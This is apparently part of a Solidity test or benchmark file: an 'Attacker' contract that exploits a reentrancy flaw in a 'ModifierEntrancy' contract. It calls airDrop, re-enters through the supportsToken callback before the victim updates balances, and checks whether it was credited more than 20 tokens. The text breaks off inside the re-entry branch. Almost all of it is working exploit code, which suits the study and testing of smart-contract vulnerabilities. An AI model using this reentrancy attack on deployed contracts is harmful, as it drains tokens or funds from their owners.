contract Attacker {
    ModifierEntrancy public victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    bool private hasBeenCalled;

    constructor(address victimAddress) {
        victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        hasBeenCalled = false;
    }

    function attack(uint256 val) public {
        reentrancyCount = 0;
        exploitSucceeded = false;
        hasBeenCalled = false;
        
        // Call the vulnerable airDrop function
        // This will trigger supportsToken() callback before state is updated
        victim.airDrop();
        
        // Check if reentrancy was successful
        // The attacker should have received tokens multiple times
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also check if we got more than the expected 20 tokens
        uint256 balance = victim.tokenBalance(address(this));
        if (balance > 20) {
            exploitSucceeded = true;
        }
    }

    // This function is called by ModifierEntrancy's supportsToken modifier
    // The vulnerability: supportsToken modifier makes external call BEFORE hasNoBalance updates state
    // Due to modifier order (hasNoBalance first, supportsToken second), the external call in supportsToken
    // happens after hasNoBalance check but BEFORE the function body executes (tokenBalance update)
    function supportsToken() external returns (bytes32) {
        reentrancyCount++;
        
        // Re-enter on first callback only
        if (!hasBeenCalled) {
